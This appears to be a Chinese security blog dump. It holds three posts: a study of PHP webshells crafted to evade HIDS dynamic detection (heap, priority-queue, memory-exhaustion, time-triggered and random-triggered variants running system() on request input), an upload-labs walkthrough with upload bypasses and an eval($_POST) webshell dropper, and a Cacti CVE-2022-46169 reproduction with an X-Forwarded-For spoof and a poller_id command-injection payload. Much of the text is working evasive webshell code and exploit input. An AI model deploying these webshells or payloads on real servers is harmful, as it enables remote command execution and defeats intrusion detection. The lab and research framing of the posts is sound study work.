堆排序\n\n动态查杀引擎根据模拟执行的情况来进行判断，那么我们能否将好的坏的掺在一起，这 就像一个箱子里面有个5球，按号码从大到小摆放好，按顺序取，想办法让引擎取到正常的 球，而我们执行的时候通过控制参数取到能变为WebShell的球。我先放入3个正常的球0、 7、8和一个恶意的球'system'，还有一个球我通过GET参数控制，暂且称之为x。  当x取大于8以上的数字时，会有一个最大堆（绿色为按最大堆顶点依次导出的顺序）：\n\n![image-20250804165147644](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804165147644.png)\n\n![image-20250804165153856](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804165153856.png)\n\n 由此可见：不同的参数值，能够引发堆结构的改变。经过多次Fuzz测试，我发现HIDS 查杀引擎对第三种情况没有考虑，于是，我通过依次将i取1和i取2来提取变量$a和$b， 再通过 $a($b); 执行命令。  当然，在这种情况下，利用的Payload 只能是 x.php?a=99;whoami 这种格式。\n\n```\n<?php \n \n$obj=new SplMaxHeap(); \n$obj->insert( $_GET[a] ); \n$obj->insert( 8 ); \n$obj->insert( 'system' ); \n$obj->insert( 7 ); \n$obj->insert( 0 ); \n//$obj->recoverFromCorruption(); \n$i=0; \n \nforeach( $obj as $number ) { \n    $i++; \n \n    if($i==1) { \n \n        $a = $number; \n    } \n    if($i==2) { \n \n        $b = $number; \n    } \n} \n \n$a($b);\n```\n\n分析 \n\n\n\n\n\n### 0x0D 优先级队列\n\n优先级队列与堆排序思想基本类似，不同的是，我这里使用优先级队列对system关键 词进行更细颗粒度的拆分。想办法让传参影响system每个字符的顺序。  请看样本：\n\n```\n<?php \nini_set(\"display_errors\",1); \n$objPQ = new SplPriorityQueue(); \n \n$objPQ->insert('m',1); \n$objPQ->insert('s',6); \n$objPQ->insert('e',2); \n$objPQ->insert('s',4); \n$objPQ->insert('y',5); \n$objPQ->insert('t',$_GET['a']); \n \n \n$objPQ->setExtractFlags(SplPriorityQueue::EXTR_DATA); \n \n//Go to TOP \n$objPQ->top(); \n \n$m=''; \n$cur = new ErrorException($_GET['b']); \nwhile($objPQ->valid()){ \n    $m.=$objPQ->current(); \n    $objPQ->next(); \n} \necho $m($cur->getMessage()); \n \n?>\n```\n\n分析\n\n用SplPriorityQueue 这个类 new了一个对象\n\n![image-20250804165347214](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804165347214.png)\n\n这个类中有优先级队列的一些方法\n\n![image-20250804165424317](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804165424317.png)\n\n这个\n\n$objPQ->insert('m',1); \n\n我们可以看到官方文档说明他有两个参数，第一个就是要进行排序的值，第二个就是优先级，优先级越大，他排在最上面\n\n这里他就是想构造 system 只需要我们将a传入3就行\n\n然后他下面用了   setExtractFlags  这个方法 调用了 SplPriorityQueue::EXTR_DATA 这个常量\n\n\n\n![](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804165923460.png)\n\n![image-20250804170014276](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804170014276.png)\n\n\n\n也就是他想用 setExtractFlags 来提取优先级队列里面的数据\n\n也就是提取system\n\n\n\n然后他又调用了top这个方法\n\n![image-20250804170153471](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804170153471.png)\n\n让他从顶部开始查看节点\n\n$cur = new ErrorException($_GET[b]);\n\n这里他又用了这个抛出错误这个类创建一个对象，然后通过getmessage()这个方法来传入我们的命令\n\n然后下面那个循环\n\n他先调用了valid ，来检查队列是否有多个节点，返回类型bool型，满足条件\n\n然后又用 current来指向当前的节点 因为前面调用了top 所以从上往下指\n\n然后next 依次往下指，取出了我们的system ，在进行了拼接命令执行函数\n\n测试\n\n![image-20250804171233692](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804171233692.png)\n\n成功执行\n\n### 0x0E 内存不足 \n\n内存不足的思想是：查杀引擎的动态执行需要消耗内存空间，由于同一时间处理的样本 很多，因此单独给每个沙箱环境分配的内存往往不会太多，如果我构造一个样本，能够让查 杀引擎由于内存不足提前终止查杀，而在真实环境中内存可以满足执行需要，就能够执行到 恶意的代码了，恰好PHP的内存申请是可以通过php_ini在运行时动态修改的。  请看样本：\n\n```\n<?php \nini_set(\"display_errors\",1); \n \nclass b extends SplObjectStorage { \n    public function getHash($o) { \n        return get_class($o); \n    } \n} \n$cur= new  DomainException($_GET[a]); \n?> \n    111111111111111111111111111111111111111111111111 \n \n<?php \nini_set(\"display_errors\",1); \nini_set(\"memory_limit\",\"100G\"); \necho memory_get_usage().'<br>'; \n$var = str_repeat(\"php7_do9gy\", 100000000); \necho memory_get_usage(); \nclass bb{}\n?> \n    111111111111111111111111111111111111111111111111 \n\n<?php \n \n \nini_set(\"display_errors\",1); \nclass A {} \n \n$s = new b; \n \n$o2 = new stdClass; \n \n \n \n$s[$o2] = 'system'; \n \n \n//these are considered equal to the objects before \n//so they can be used to access the values stored under them \n$p1 = new stdClass; \necho $s[$p1]($cur->getMessage()); \n?> \n```\n\n分析\n\n第一段php代码：\n\n他先定义了一个b类继承了SplObjectStorage类的属性和方法，重写了getHash这个方法\n\n让他返回对象名\n\n然后\n\n他又new了一个对象通过DomainException这个类，也是一个抛出异常的一个类，$_GET[a]应该就是我们执行的参数，通过getmessage来获取\n\n\n\n第二段php代码：\n\n他初始化了一个 memory_limit  分配了100g的内存\n\n然后他打印了一下这个 内存量，然后他又用str_repeat这个函数 一直重复的赋值 php7_do9gy这个字符串\n\n100000000次\n\n然后他又打印了一下\n\n并定义了一个空的类bb\n\n\n\n第三段php代码：\n\n首先定义了一个空A类\n\n然后通过b类new了一个$s这个对象，\n\n又通过stdClass这个类 new 了一个o2的对象\n\n然后他将$s[$o2] = 'system'; \n\n然后又用 stdClass 这个类new了一个p1的对象\n\n最后进行拼接打印输出\n\n![image-20250804173630947](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804173630947.png)\n\n可以看到最开始内存占用是 403984  变成了1000405544 \n\n成功\n\n### 0x0F 未来WebShell\n\n思路：动态查杀是基于PHP 文件上传后动态执行的，那么有没有可能上传一个文件， 上传时它还不是WebShell，它自己过几分钟变成一个 WebShell呢？这样在上传时就可以躲 过动态查杀。正好，结合0x05和0x06两种模式，我们尽可能将是否为WebShell的判断依 据前置到一个if条件中，然后让这个条件以当前时间为依据，那么上传时的Unix时间戳小 于某个值，返回结果True，动态引擎自然判定这是一个正常的文件，而过一段时间，时间变 化了返回结果变为了False，再去请求这个WebShell 自然就能够执行了。  一直想构造这样一个未来的webshell，但是由于网站对时间相关的函数过滤很严，直到我发 现了DateTime类的getTimestamp方法。  仅有这个思路是不够的，在实现时，还结合了反射的技巧以及PHP条件优化。 \n\n\n\n```\n<?php \nini_set(\"display_errors\",1); \nfunction foo($test, $bar = FSYSTEM) \n{ \n    echo $test . $bar; \n} \n \n$function = new ReflectionFunction('foo'); \n$q = new ParseError($_GET[a]); \nforeach ($function->getParameters() as $param) { \n    $da = new DateTime(); \n \n    echo $da->getTimestamp(); \n    echo 'Name: ' . $param->getName() . PHP_EOL; \n    $n='F'; \n    if ($param->isOptional()) { \n        if($da->getTimestamp()>=1648470471||$n='1'){ \n            echo $n; \n        } \n \n \n        echo 'Default value: ' . \nltrim($param->getDefaultValueConstantName(),$n)($q->getMessage()); \n    } \n    echo PHP_EOL; \n} \n?> \n```\n\n分析\n\n他先定义了一个foo的函数里面有两个参数，test没有默认值，需要用户传入，bar有默认值，用户可传可不传\n\n然后 通过ReflectionFunction这个类创建了一个function这个对象，这个类英文翻译为反射函数\n\n我们可以知道，他将foo这个函数的属性给了$function \n\n然后他又通过了 ParseError这个类抛出异常来接收我们要执行的命令\n\nif判断里面用 getParameters 获取了一下$function 的参数，也就是获取到了 test，和bar\n\n用这两个参数进行循环\n\n循环里面，他用DateTime 这个类创建了一个对象 $da，然后用getTimestamp() 获取了一下unix时间戳并打印出来，然后 getName获取属性名赋值给$param， 然后将$n='F'; \n\n进入下面的判断\n\n\n\n![image-20250804175239499](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804175239499.png)\n\nisOptional() 调用这个方法来判断$param 里面的属性是否是可选的参数，也就是可以传值也可以不传值的参数\n\nif($da->getTimestamp()>=1648470471||$n='1')\n\n这里这个判断 如果时间戳大于 就不$n='1'进行这个赋值  直接往下继续执行了，如果小于就将 $n='1' 进行赋值\n\n最后ltrim($param->getDefaultValueConstantName(),$n)($q->getMessage()); \n\n调用这个来构造system()，这里他是通过getDefaultValueConstantName来获取默认的参数值，并交给ltrim进行清洗掉$n，也就是将FSYSTEM 中的F 去掉，就刚好是我们的system，如果这个$n是1 的话，它里面没有1 所以不做处理，会让waf认为是正常函数，污点就会断掉，只有在特定的时间才会触发\n\n测试\n\n这里我们修改一下这个时间戳为1754301527\n\n![image-20250804175826475](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804175826475.png)\n\n等下时间到\n\n![image-20250804175852801](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804175852801.png)\n\n成功执行\n\n### 0x10 量子WebShell\n\n不满足于未来WebShell的挖掘，我又找到了一种新的模式——量子WebShell。在PHP 引擎查杀时，利用随机数，让判断条件在大多数情况下都不成立，此时这个WebShell处于 是WebShell和非WebShell的叠加态，当且仅当参数传递缩小随机数生成范围以后，让条件 恒成立，此时该样本坍缩到一个WebShell的状态，可以稳定触发。  请看代码：\n\n```\n<?php \nini_set(\"display_errors\",1); \nfunction foo($test, $bar = FSYSTEM) \n{ \n    echo $test . $bar; \n} \n \n$function = new ReflectionFunction('foo'); \n$q = new ParseError($_GET[a]); \n$p = new ParseError($_SERVER[HTTP_A]); \nforeach ($function->getParameters() as $param) { \n    $da = new DateTime(); \n \n    echo $da->getTimestamp(); \n    echo 'Name: ' . $param->getName() . PHP_EOL; \n    $n='F'; \n    if ($param->isOptional()) { \n        if(mt_rand(55,$p->getMessage()??100)==55||$n='1'){ \n            echo $n; \n        } \n \n \n        echo 'Default value: ' . \nltrim($param->getDefaultValueConstantName(),$n)($q->getMessage()); \n    } \n    echo PHP_EOL; \n} \n?> \n```\n\n这里他跟前面列子不一样的地方就是判断的地方\n\n前面还是一样用反射函数构建等等。。。\n\n(mt_rand(55,$p->getMessage()??100)==55||$n='1')\n\n![image-20250804180322020](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804180322020.png)\n\n他通过mt_rand这个函数来随机取值，如果我们的$_SERVER[HTTP_A]没传值 getMessage()这个就接收不到参数\n\n他的范围就(55，100), 这样经过mt_rand()很难精准的取到55，所以这里我们传值就传55，让他定死\n\n$p = new ParseError($_SERVER[HTTP_A]); \n\n就伪造一个header头 HTTP_A:55\n\n![image-20250804183338675](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804183338675.png)\n\n这样他前面的条件一直成立，就不会重新赋值给$n,我们的$n就是F 就可以经过ltrim 清洗掉F ，构造出SYSTEM\n\n\n\n测试\n\n![image-20250804183353029](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804183353029.png)\n\n成功执行\n\n","tags":["bypass"],"categories":["web安全"]},{"title":"upload-labs 靶场","url":"/2025/07/28/upload-labs-靶场/","content":"\n练练文件上传\n\n <!--more-->\n\n#### pass-01（前端验证）\n\n![image-20250728204908075](upload-labs-靶场/image-20250728204908075.png)\n\n前端判断了文件类型\n\n可以直接利用bp拦截抓包改包\n\n这里我们直接利用浏览器控制台让他这个函数直接返回true\n\n```\ncheckFile = function() { return true; };\n```\n\n控制台直接执行\n\n![image-20250728205240835](upload-labs-靶场/image-20250728205240835.png)\n\n直接上传php文件即可\n\n#### pass-02（MIME验证）\n\n![image-20250728205753347](upload-labs-靶场/image-20250728205753347.png)\n\n![image-20250728205833948](upload-labs-靶场/image-20250728205833948.png)\n\n这里只进行了文件类型的判断，用户可以通过改包的方式，用户可控\n\n#### pass-03（黑名单验证，特殊后缀）\n\n![image-20250728205329018](upload-labs-靶场/image-20250728205329018.png)\n\n\n\n黑名单。直接上传`.htaccess` 强制解析jpg文件，或者上传php3,php4,或者phtml，他这里应该是考后者\n\n![image-20250728205626972](upload-labs-靶场/image-20250728205626972.png)\n\n可以解析\n\n#### pass-04（黑名单验证，.htaccess）\n\n![image-20250728205936310](upload-labs-靶场/image-20250728205936310.png)\n\n还是黑名单，过滤了一堆\n\n这里也没有过滤我们的`.htaccess` 可以进行解析jpg文件\n\n但是这里他还有一个逻辑漏洞，可以绕过他这个过滤\n\n他没有提前对我们上传的文件进行重命名操作，所以我们可以利用双重拓展名来绕过前面的一系列操作\n\n类似于我们传`shell.php.jpg`\n\n![image-20250728210846616](upload-labs-靶场/image-20250728210846616.png)\n\n#### pass-05（大小写绕过）\n\n![image-20250728211012033](upload-labs-靶场/image-20250728211012033.png)\n\n第一眼跟第四关没区别。看了下提示发现\n\n![image-20250728211153202](upload-labs-靶场/image-20250728211153202.png)\n\n禁用了我们的`.htaccess`  ,所以我们依然可以用双拓展名绕过\n\n也可以上传`.user.ini`  解析我们上传的jpg\n\n#### pass-06（黑名单验证，.user.ini.）![image-20250728211347095](upload-labs-靶场/image-20250728211347095.png)\n\n\n\n没看出来区别\n\n![image-20250728211533211](upload-labs-靶场/image-20250728211533211.png)\n\n他又放开了`.htaccess` \n\n而且我们的双拓展名依旧可以绕过\n\n#### pass-07\n\n ![image-20250728211627548](upload-labs-靶场/image-20250728211627548.png)\n\n![image-20250728211645405](upload-labs-靶场/image-20250728211645405.png)\n\n依旧双拓展名绕过\n\n#### pass-08（黑名单验证，特殊字符::$DATA绕过）\n\n![image-20250728211714737](upload-labs-靶场/image-20250728211714737.png)\n\n`shell.php::$DATA`\n\n依旧双拓展名绕过\n\n#### pass-09\n\n![image-20250728211758766](upload-labs-靶场/image-20250728211758766.png)\n\n依旧双拓展名绕过\n\n#### pass-10\n\n![image-20250728211832976](upload-labs-靶场/image-20250728211832976.png)\n\n依旧双拓展名绕过\n\n或者\n\n`shell.php::$DATA`\n\n#### pass-11（%00截断）\n\n终于用上白名单了\n\n![image-20250728213248089](upload-labs-靶场/image-20250728213248089.png)\n\n可以看到这里用户可以控制上传的路径\n\n考虑用%00截断\n\n因为在c语言的底层`/0` 代表终止 ，php的底层代码就是c语言，%00 urldecode 就是/0 所以可以截断\n\n```\n?save_path=../upload/1.php%00 \n```\n\n#### pass-12\n\n![image-20250728213947630](upload-labs-靶场/image-20250728213947630.png)\n\n刚刚是get传参，这次是post，一样的道理\n\n%00截断\n\npost我们需要在十六进制里面去修改\n\n![image-20250728214415328](upload-labs-靶场/image-20250728214415328.png)\n\n#### pass-13 图片马\n\n![image-20250728214449370](upload-labs-靶场/image-20250728214449370.png)\n\n图片马，加文件包含\n\n直接上传即可\n\n他这里取了前两个字节，我们要保证我们的图片马 开头是 .PNG. GIF89a  等\n\n然后文件包含直接利用即可\n\n#### pass-14\n\n![image-20250728214822738](upload-labs-靶场/image-20250728214822738.png)\n\n一样的跟13关\n\n#### pass-15\n\n![image-20250728214913814](upload-labs-靶场/image-20250728214913814.png)\n\n我们的图片马经过了精心的处理。所以这个我们也可以直接上传\n\n#### pass-16\n\n\n\n![image-20250728215059818](upload-labs-靶场/image-20250728215059818.png)\n\n这里他把我们的图片经过了二次渲染后在进行判断。所以我们要保证我们的图片在二次渲染后php代码还存在\n\n我们可以随便先上传一个图片\n\n然后将上传的图片下载下来，用010editor 观察两张图片前后未变化的部分，然后在这部分插入我们的php代码\n\n推荐用GIF图片\n\n![22](upload-labs-靶场/22-17537119060744.gif)\n\n#### pass-17\n\n![image-20250728221203081](upload-labs-靶场/image-20250728221203081.png)\n\n\n\n代码处理流程\n\n- 移动文件到指定路径\n- 判断文件后缀是否符合\n- 符合则重命名\n- 不符合则删除文件\n\n这里存在逻辑的问题，先移动文件到指定目录再判断是否符合并删除。服务器处理代码时总会存在一定的时间差，当我们在上传文件后就多次快速尝试访问目标文件，那么是不是有机会在删除前成功访问文件。而如果文件的代码是重新创建一个木马文件，新木马文件则永远不会被删除了！\n\n```\n<?php\n\n$webshell = '<?php @eval($_POST[\"1\"]); ?>';\nfile_put_contents('1.php', $webshell);\necho \"Webshell created as 1.php\";\n?>\n\n```\n\n![image-20250728222022730](upload-labs-靶场/image-20250728222022730.png)\n\n#### pass-18条件竞争+apache解析漏洞\n\n```\n//index.php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit']))\n{\n    require_once(\"./myupload.php\");\n    $imgFileName =time();\n    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);\n    $status_code = $u->upload(UPLOAD_PATH);\n    switch ($status_code) {\n        case 1:\n            $is_upload = true;\n            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;\n            break;\n        case 2:\n            $msg = '文件已经被上传，但没有重命名。';\n            break; \n        case -1:\n            $msg = '这个文件不能上传到服务器的临时文件存储目录。';\n            break; \n        case -2:\n            $msg = '上传失败，上传目录不可写。';\n            break; \n        case -3:\n            $msg = '上传失败，无法上传该类型文件。';\n            break; \n        case -4:\n            $msg = '上传失败，上传的文件过大。';\n            break; \n        case -5:\n            $msg = '上传失败，服务器已经存在相同名称文件。';\n            break; \n        case -6:\n            $msg = '文件无法上传，文件不能复制到目标目录。';\n            break;      \n        default:\n            $msg = '未知错误！';\n            break;\n    }\n}\n\n//myupload.php\nclass MyUpload{\n......\n......\n...... \n  var $cls_arr_ext_accepted = array(\n      \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\",\n      \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );\n\n......\n......\n......  \n  /** upload()\n   **\n   ** Method to upload the file.\n   ** This is the only method to call outside the class.\n   ** @para String name of directory we upload to\n   ** @returns void\n  **/\n  function upload( $dir ){\n    \n    $ret = $this->isUploadedFile();\n    \n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->setDir( $dir );\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->checkExtension();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->checkSize();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );    \n    }\n    \n    // if flag to check if the file exists is set to 1\n    \n    if( $this->cls_file_exists == 1 ){\n      \n      $ret = $this->checkFileExists();\n      if( $ret != 1 ){\n        return $this->resultUpload( $ret );    \n      }\n    }\n\n    // if we are here, we are ready to move the file to destination\n\n    $ret = $this->move();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );    \n    }\n\n    // check if we need to rename the file\n\n    if( $this->cls_rename_file == 1 ){\n      $ret = $this->renameFile();\n      if( $ret != 1 ){\n        return $this->resultUpload( $ret );    \n      }\n    }\n    \n    // if we are here, everything worked as planned :)\n\n    return $this->resultUpload( \"SUCCESS\" );\n  \n  }\n......\n......\n...... \n};\n\n```\n\n在index.php中，首先new了一个MyUpload类，传入了上传的文件名，临时名，文件大小，随机time名（这个随机time和文件最终名字有关）\n\n\n\n![image-20250728222746421](upload-labs-靶场/image-20250728222746421.png)\n\n然后传入UPLOAD_PATH给upload函数（也就是吧../upload传入），那么我们得看看类里面的代码才知道具体发生了什么。。\n\n\n\n![image-20250728222706668](upload-labs-靶场/image-20250728222706668.png)\n\n对类初始化的时候调用Myupload函数，传入对应参数赋值\n\n在upload函数中，是先进行文件路径、后缀、大小判断，然后文件移动、重命名。这里就出现很经典的逻辑问题了，先移动再重命令，就可以利用条件竞争对其进行访问。\n\n可是问题出现了，其对文件上传后缀进行了检验，只能白名单上传\n\n这里就要配合到apache的解析漏洞，在apache版本符合条件下，对mime.types中没有涉及的文件后缀不会解析，查看httpd.conf文件下的mime.types，没有发现7z后缀，说明不会解析7z文件\n\n![image-20250728223000837](upload-labs-靶场/image-20250728223000837.png)\n\n比如`test.php.7z`这个文件，apache的解析是从后往前，当7z不能解析时，其向前解析一直到可以解析的后缀为止，所以将`test.php.7z`当作`test.php`执行。但是文件后缀上传后还是`test.php.7z`全称吗？看看代码，经过rename之后，文件名被修改为upload+time()函数的值+最后一个小数点后的后缀名，即变成了`upload+time.7z`这样，没有php了我们如何利用？\n\n![image-20250728223105384](upload-labs-靶场/image-20250728223105384.png)\n\n这里就需要配合刚才说的条件竞争漏洞了，在rename之前是move操作，move后的极短时间内是没有rename的，我们通过频发发包访问达到目的。这里需要提一下，这关的文件上传目录不是在upload目录下，应该是作者不小心忽略的原因，所以会导致文件名中有个upload，但是不影响做题，如果想修改为upload目录下，则需要在rename函数中添加`/`即可\n\n我们原题吧\n\n\n\n开始抓包\n\n一个为上传包，一个为访问包\n\n","tags":["文件上传"],"categories":["web安全"]},{"title":"cacti CVE-2022-46169","url":"/2025/07/25/cacti-CVE-2022-46169/","content":"\nCVE-2022-46169 的rce 漏洞复现\n\n<!--more-->\n\n#### 环境配置\n\n我们在docker环境内配置\n\n![image-20250725134750077](cacti-CVE-2022-46169/image-20250725134750077.png)\n\n\n\n然后我们在vs code连接docker容器\n\n![image-20250725135718151](cacti-CVE-2022-46169/image-20250725135718151.png)\n\n\n\n现在需要配置xdebug，等会方便我们追代码\n\n```\npecl install xdebug-3.1.6\n运行安装 xdebug\ndocker-php-ext-enable xdebug\n启用 xdebug 扩展\n\n在/usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini，添加如下内容：\n\nzend_extension=xdebug\nxdebug.mode=debug\nxdebug.start_with_request=yes\n```\n\n\n\n这个添加需要我们在vs code中完成\n\n然后我们需要重启一下容器\n\n`docker restart edf5255aa17d`\n\n然后重新连接即可\n\n\n\n完成后我们就可以愉快的调试了\n\n![image-20250725142041390](cacti-CVE-2022-46169/image-20250725142041390.png)\n\n没问题断下来了\n\n\n\n![image-20250725141447174](cacti-CVE-2022-46169/image-20250725141447174.png)\n\n我们还需要创建一个采集器\n\n![image-20250725141537182](cacti-CVE-2022-46169/image-20250725141537182.png)\n\n然后我们就可以退出登录了\n\n避免session的影响\n\n#### 代码审计\n\n我么的漏洞利用点在`/remote_agent.php`\n\n因为我们有payload ，直接下断。传入看一下整个流程\n\n```\n/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`touch+/tmp/success`\nX-Forwarded-For: 127.0.0.1\n```\n\n\n\n![image-20250725185549794](cacti-CVE-2022-46169/image-20250725185549794.png)\n\n断下来了\n\n往下追\n\n\n\n![image-20250725185633322](cacti-CVE-2022-46169/image-20250725185633322.png)\n\n这里发现有一个鉴权函数，我们进去看一下\n\n```\nfunction remote_client_authorized() {\n\tglobal $poller_db_cnn_id;\n\n\t/* don't allow to run from the command line */\n\t$client_addr = get_client_addr();\n\tif ($client_addr === false) {\n\t\treturn false;\n\t}\n\n\tif (!filter_var($client_addr, FILTER_VALIDATE_IP)) {\n\t\tcacti_log('ERROR: Invalid remote agent client IP Address.  Exiting');\n\t\treturn false;\n\t}\n\n\t$client_name = gethostbyaddr($client_addr);\n\n\tif ($client_name == $client_addr) {\n\t\tcacti_log('NOTE: Unable to resolve hostname from address ' . $client_addr, false, 'WEBUI', POLLER_VERBOSITY_MEDIUM);\n\t} else {\n\t\t$client_name = remote_agent_strip_domain($client_name);\n\t}\n\n\t$pollers = db_fetch_assoc('SELECT * FROM poller', true, $poller_db_cnn_id);\n\n\tif (cacti_sizeof($pollers)) {\n\t\tforeach($pollers as $poller) {\n\t\t\tif (remote_agent_strip_domain($poller['hostname']) == $client_name) {\n\t\t\t\treturn true;\n\t\t\t} elseif ($poller['hostname'] == $client_addr) {\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\n\t}\n\n\tcacti_log(\"Unauthorized remote agent access attempt from $client_name ($client_addr)\");\n\n\treturn false;\n}\n```\n\n这里我们发现，`$client_addr = get_client_addr();` 直接通过这个函数来获取的ip地址，我们继续进去看看\n\n\n\n```\nfunction get_client_addr($client_addr = false) {\n\t$http_addr_headers = array(\n\t\t'X-Forwarded-For',\n\t\t'X-Client-IP',\n\t\t'X-Real-IP',\n\t\t'X-ProxyUser-Ip',\n\t\t'CF-Connecting-IP',\n\t\t'True-Client-IP',\n\t\t'HTTP_X_FORWARDED',\n\t\t'HTTP_X_FORWARDED_FOR',\n\t\t'HTTP_X_CLUSTER_CLIENT_IP',\n\t\t'HTTP_FORWARDED_FOR',\n\t\t'HTTP_FORWARDED',\n\t\t'HTTP_CLIENT_IP',\n\t\t'REMOTE_ADDR',\n\t);\n\n\t$client_addr = false;\n\tforeach ($http_addr_headers as $header) {\n\t\tif (!empty($_SERVER[$header])) {\n\t\t\t$header_ips = explode(',', $_SERVER[$header]);\n\t\t\tforeach ($header_ips as $header_ip) {\n\t\t\t\tif (!empty($header_ip)) {\n\t\t\t\t\tif (!filter_var($header_ip, FILTER_VALIDATE_IP)) {\n\t\t\t\t\t\tcacti_log('ERROR: Invalid remote client IP Address found in header (' . $header . ').', false, 'AUTH', POLLER_VERBOSITY_DEBUG);\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$client_addr = $header_ip;\n\t\t\t\t\t\tcacti_log('DEBUG: Using remote client IP Address found in header (' . $header . '): ' . $client_addr . ' (' . $_SERVER[$header] . ')', false, 'AUTH', POLLER_VERBOSITY_DEBUG);\n\t\t\t\t\t\tbreak 2;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn $client_addr;\n}\n```\n\n![image-20250725185824538](cacti-CVE-2022-46169/image-20250725185824538.png)\n\n这里看起来就是 依次取了这些请求头，然后将他放进下面取依次循环\n\n![image-20250725185921203](cacti-CVE-2022-46169/image-20250725185921203.png)\n\n这里用循环来判断ip是否合法\n\n但是他这里直接break 2，跳出两层循环，\n\n所以他一旦找到了一个合法的ip。他就会跳出循环直接将当前的ip赋值给`client_addr`\n\n![image-20250725191132752](cacti-CVE-2022-46169/image-20250725191132752.png)\n\n![image-20250725191513139](cacti-CVE-2022-46169/image-20250725191513139.png)\n\n当我们不赋值的时候，他读取的REMOTE_ADDR 在我们设置的HTTP_X_FORWARDED_FOR的后面所以\n\n他获取到了ip后就直接跳出了，127.0.0.1 ，合法 ，绕过了这个鉴权函数\n\n\n\n重新下断到\n\n![image-20250725191653328](cacti-CVE-2022-46169/image-20250725191653328.png)\n\n进入分析\n\n```\nfunction set_default_action($default = '') {\n\tif (!isset_request_var('action')) {\n\t\tset_request_var('action', $default);\n\t} elseif (is_array(get_nfilter_request_var('action'))) {\n\t\tif (read_config_option('log_validation') == 'on') {\n\t\t\tcacti_log('WARNING: Request variable \\'action\\' was passed as array in ' . $_SERVER['SCRIPT_NAME'] . '.', false, 'WEBUI');\n\t\t}\n\n\t\tset_request_var('action', $_REQUEST['action'][0]);\n\t} else {\n\t\tset_request_var('action', $_REQUEST['action']);\n\t}\n}\n```\n\n这里就是对action做了处理\n\n如果传入的action不正常，那么就会做如下处理\n\n不允许传入数组，且必须要有参数\n\n如果传入数组，那么就会提交日志，记录这是异常行为\n\n所以这里我们需要传入正常的字符串\n\n因为我们利用点 在后面那个pro 函数执行的地方，所以我们要进入\n\n`case 'polldata':` 这个分支\n\n也就是为什么，我们的action要传入`polldata` 这个值\n\n![image-20250725192557671](cacti-CVE-2022-46169/image-20250725192557671.png)\n\n```\nfunction poll_for_data() {\n\tglobal $config;\n\n\t$local_data_ids = get_nfilter_request_var('local_data_ids');\n\t$host_id        = get_filter_request_var('host_id');\n\t$poller_id      = get_nfilter_request_var('poller_id');\n\t$return         = array();\n\n\t$i = 0;\n\n\tif (cacti_sizeof($local_data_ids)) {\n\t\tforeach($local_data_ids as $local_data_id) {\n\t\t\tinput_validate_input_number($local_data_id);\n\n\t\t\t$items = db_fetch_assoc_prepared('SELECT *\n\t\t\t\tFROM poller_item\n\t\t\t\tWHERE host_id = ?\n\t\t\t\tAND local_data_id = ?',\n\t\t\t\tarray($host_id, $local_data_id));\n\n\t\t\t$script_server_calls = db_fetch_cell_prepared('SELECT COUNT(*)\n\t\t\t\tFROM poller_item\n\t\t\t\tWHERE host_id = ?\n\t\t\t\tAND local_data_id = ?\n\t\t\t\tAND action = 2',\n\t\t\t\tarray($host_id, $local_data_id));\n\n\t\t\tif (cacti_sizeof($items)) {\n\t\t\t\tforeach($items as $item) {\n\t\t\t\t\tswitch ($item['action']) {\n\t\t\t\t\tcase POLLER_ACTION_SNMP: /* snmp */\n\t\t\t\t\t\tif (($item['snmp_version'] == 0) || (($item['snmp_community'] == '') && ($item['snmp_version'] != 3))) {\n\t\t\t\t\t\t\t$output = 'U';\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t$host = db_fetch_row_prepared('SELECT ping_retries, max_oids FROM host WHERE hostname = ?', array($item['hostname']));\n\t\t\t\t\t\t\t$session = cacti_snmp_session($item['hostname'], $item['snmp_community'], $item['snmp_version'],\n\t\t\t\t\t\t\t\t$item['snmp_username'], $item['snmp_password'], $item['snmp_auth_protocol'], $item['snmp_priv_passphrase'],\n\t\t\t\t\t\t\t\t$item['snmp_priv_protocol'], $item['snmp_context'], $item['snmp_engine_id'], $item['snmp_port'],\n\t\t\t\t\t\t\t\t$item['snmp_timeout'], $host['ping_retries'], $host['max_oids']);\n\n\t\t\t\t\t\t\tif ($session === false) {\n\t\t\t\t\t\t\t\t$output = 'U';\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t$output = cacti_snmp_session_get($session, $item['arg1']);\n\t\t\t\t\t\t\t\t$session->close();\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tif (prepare_validate_result($output) === false) {\n\t\t\t\t\t\t\t\tif (strlen($output) > 20) {\n\t\t\t\t\t\t\t\t\t$strout = 20;\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t$strout = 